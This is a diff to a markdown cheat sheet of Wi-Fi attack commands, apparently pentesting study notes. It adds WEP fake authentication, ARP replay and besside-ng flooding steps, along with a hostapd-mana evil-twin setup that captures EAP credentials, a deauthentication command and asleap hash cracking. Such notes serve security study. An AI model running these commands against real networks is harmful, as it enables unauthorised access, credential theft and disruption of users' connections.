@@ -253,21 +253,31 @@ rainbow tables
 `genpmk -f /usr/share/john/password.lst -d output-file.txt -s AP-Name`
 
 ## WEP Attacks  
-### Fake authentication 
-Used when no clients connected to AP and you need an associated MAC address for attacking.  
-| Command  | Description |
-|--|--|
-| `aireplay-ng -1 0 -e AP-NAME -a <AP-MAC> -h <Our Cards MAC> -y sharedkeyxor wlan0` | Fake Authentication with Shared Key Authentication
-| `aireplay-ng -1 0 -e AP-NAME -a <AP-MAC> -h <Our Cards MAC>  wlan0` | Fake Authentication against open networks
-
-### IV Cracking 
+### IVS Cracking 
 | Command  | Description |
 |--|--|
 | `airmon-ng start wlan0` | Fake Authentication with Shared Key Authentication
 | `sudo airodump-ng wlan0mon --encrypt WEP` | check for WEP networks
 | `sudo airodump-ng wlan0mon --ivs -c 3 --bsside <AP-MAC> -w ivs-capture-file ` | capture IVS from specific AP  
 | `sudo aircrack-ng ./ivs-capture-file.cap ` | crack key  
+If not getting a lot of Data packets, nothing connected or communicating to AP. Connect with Fake Authentication Attack.  
 
+### Fake authentication 
+Used when no clients connected to AP and you need an associated MAC address for attacking. 
+| Command  | Description |
+|--|--|
+| `aireplay-ng -1 0 -e AP-NAME -a <AP-MAC> -h <Our Cards MAC> -y sharedkeyxor wlan0` | Fake Authentication with Shared Key Authentication
+| `aireplay-ng -1 0 -e AP-NAME -a <AP-MAC> -h <Our Cards MAC>  wlan0` | Fake Authentication against open networks
+
+### ARP Replay Attack.
+With connection via fake authentication, we can use ARP replay attack to generate traffic to capture data packets (IVS).
+| Command  | Description |
+|--|--|
+| `aireplay-ng -3 -b <AP-MAC>  wlan0` | Once receive ARP request, will replay it to the target, increasing data packets.
+
+### Besside-ng 
+Automate the above using besside-ng.  
+`besside-ng wlan0 -c3 -b <AP-MAC>`.  This will inject and flood the AP to obtain IVs saving to a file.  
 
 ## WPS Network Attacks 
 Wi-Fi Protected Setup (WPS) allows for sharing WPA and WPA2 passphrases securely.  
@@ -393,7 +403,7 @@ Protection Extensible Authentication Protocol (PEAP)
 - After identitiy provided, next frame shows if PEAP or TLS etc.  
 
 ### Rogue AP 
-Rogue AP to match settings as closely as possible.  
+Rogue AP to match settings as closely as possible.  https://github.com/sensepost/hostapd-mana/wiki/Creating-PSK-or-EAP-Networks  
 freeradius (open source RADIUS server) to generate a certificate.  
 
 1. Monitor Mode.  `airmon-ng start wlan0`
@@ -416,9 +426,60 @@ freeradius (open source RADIUS server) to generate a certificate.
 17. Edit `hostapd-mana` for rogue ap settings - `nano /etc/hostapd-mana/mana.conf` 
 18. Make same SSID as target AP  
 19. Create host eap mana file `nano /etc /hostapd-mana/mana.eap_user`
-20. First column * indicates any user. You can specfy a user and domain here.  
-21. Start hostapd-mana `hostapd-mana /etc/hostapdmana/mana.conf`
-22. After a host connects, you will see a username and password hash 
+```
+*		PEAP,TTLS,TLS,MD5,GTC
+"t"     	TTLS-MSCHAPV2,MSCHAPV2,MD5,GTC,TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP  "1234test"  [2]
+```
+21. First column * indicates any user. You can specfy a user and domain here.  
+22. Start hostapd-mana `hostapd-mana /etc/hostapdmana/mana.conf`
+23. After a host connects, you will see a username and password hash
+24. `aireplay-ng -0 100 -a <Ap-MAC> wlan0 --ignore-negative-one`
+
+### hostapd-mana configs
+#### EAP networks
+##### mana-config
+```
+interface=wlan1 #second card not in monitor mode
+ssid=SSID
+hw_mode=g
+channel=1
+auth_algs=3
+wpa=3
+wpa_key_mgmt=WPA-EAP
+wpa_pairwise=TKIP CCMP
+ieee8021x=1
+eap_server=1
+eap_user_file=hostapd.eap_user
+ca_cert=/ca.pem
+server_cert=/server.pem
+private_key=/server.key
+dh_file=/dhparam.pem
+mana_wpe=1
+mana_eapsuccess=1
+mana_credout=hostapd.creds
+```
+##### Diffie-Helman 
+`openssl dhparam 2048 > dhparam.pem`
+##### keys
+```
+openssl genrsa -out server.key 2048
+openssl req -new -sha256 -key server.key -out csr.csr
+openssl req -x509 -sha256 -days 365 -key server.key -in csr.csr -out server.pem
+ln -s server.pem ca.pem
+```
+
+#### WPA/2 Pre-Shared Keys (PSK Networks)
+```
+interface=wlan0
+ssid=PSKNet
+channel=6
+hw_mode=g
+wpa=3
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP CCMP
+wpa_passphrase=ASecurePassword
+auth_algs=3
+```
 
 Attempt decrypt:
 Copy and paste mana output where it says `asleap -C MAC -R MAC` and add wordlist to this.
